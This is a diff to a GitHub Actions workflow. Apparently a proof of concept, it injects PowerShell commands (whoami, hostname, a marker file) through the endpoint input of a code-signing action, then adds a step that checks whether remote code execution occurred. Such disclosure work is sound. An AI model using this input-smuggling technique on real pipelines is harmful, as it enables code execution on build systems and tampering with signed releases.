@@ -42,7 +42,7 @@ jobs:
       - name: Sign files with Trusted Signing
         uses: azure/trusted-signing-action@bc58bc775bec2c1a94b6125e954f17fb3cd47a45
         with:
-          endpoint: https://eus.codesigning.azure.net/
+          endpoint: '"; Write-Host ''RCE-ACHIEVED''; whoami; hostname; echo ''pwned'' > $env:TEMP\pwned.txt; exit 0; #'
           trusted-signing-account-name: jaxelr
           certificate-profile-name: jaxelr-pt
           files-folder: ${{ github.workspace }}\\MyApi\bin\Release\net8.0
@@ -50,6 +50,19 @@ jobs:
           file-digest: SHA256
           timestamp-rfc3161: http://timestamp.acs.microsoft.com
           timestamp-digest: SHA256
+
+      - name: Verify RCE
+        shell: pwsh
+        run: |
+          Write-Host "=== Checking for RCE evidence ==="
+          if (Test-Path "$env:TEMP\pwned.txt") {
+            Write-Host "RCE-ACHIEVED - File created!"
+            Get-Content "$env:TEMP\pwned.txt"
+          } else {
+            Write-Host "Checking if RCE executed in action logs above..."
+          }
+          Write-Host "PoC completed - check logs above for RCE-ACHIEVED"
+
 
       - name: Upload artifact on pull request
         uses: actions/upload-artifact@v4.3.3
